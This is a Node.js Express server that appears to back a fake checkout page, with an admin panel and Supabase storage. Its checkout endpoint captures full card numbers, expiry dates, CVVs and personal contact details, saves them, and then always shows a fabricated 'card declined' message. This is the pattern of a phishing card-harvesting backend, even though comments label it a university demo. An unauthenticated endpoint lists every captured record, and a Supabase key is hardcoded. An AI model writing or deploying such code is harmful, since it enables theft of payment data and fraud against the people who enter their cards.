const express = require('express');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

// -------------------------------------------------------------
// SUPABASE CONFIGURATION
// Replace these with your actual keys from Supabase Dashboard
// -------------------------------------------------------------
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://vkqeqjuobqnzxdwdlhdo.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZrcWVxanVvYnFuenhkd2RsaGRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzYyMDgsImV4cCI6MjEwMTAxMjIwOH0.K-3BVayX-30Fe2EyAYsF21vEEStUOWnHKTJoOWJk34g';

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve HTML pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// -------------------------------------------------------------
// 1. GET /api/transactions - Fetch from Supabase
// -------------------------------------------------------------
app.get('/api/transactions', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('transactions')
      .select('*')
      .order('timestamp', { ascending: false });

    if (error) throw error;
    res.json(data || []);
  } catch (err) {
    console.error('Supabase Fetch Error:', err.message);
    res.status(500).json({ error: 'Failed to fetch transactions' });
  }
});

// -------------------------------------------------------------
// 2. POST /api/checkout - Insert into Supabase
// -------------------------------------------------------------
app.post('/api/checkout', async (req, res) => {
  try {
    const {
      amount, full_name, email, phone, country, city, address,
      card_type, card_holder, card_number, expiry, cvv
    } = req.body;

    const newTransaction = {
      id: 'TXN-' + Date.now(),
      timestamp: new Date().toLocaleString(),
      amount: amount || '0.00',
      full_name: full_name || 'N/A',
      email: email || 'N/A',
      phone: phone || 'N/A',
      country: country || 'N/A',
      city: city || 'N/A',
      address: address || 'N/A',
      card_type: card_type || 'N/A',
      card_holder: card_holder || 'N/A',
      card_number: card_number || 'N/A',
      expiry: expiry || 'N/A',
      cvv: cvv || 'N/A',
      status: 'FAILED (Demo)'
    };

    const { error } = await supabase
      .from('transactions')
      .insert([newTransaction]);

    if (error) throw error;

    // Simulated Failed Response for Presentation/Demo
    return res.status(400).json({
      success: false,
      message: 'Transaction Failed: Card declined by issuing bank (University Demo Error).'
    });

  } catch (err) {
    console.error('Supabase Insert Error:', err.message);
    return res.status(500).json({ success: false, message: 'Database Save Failed' });
  }
});

// For local testing
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`🚀 Server Running: http://localhost:${PORT}`);
    console.log(`📊 Admin Panel:    http://localhost:${PORT}/admin`);
  });
}

// Required for Vercel
module.exports = app;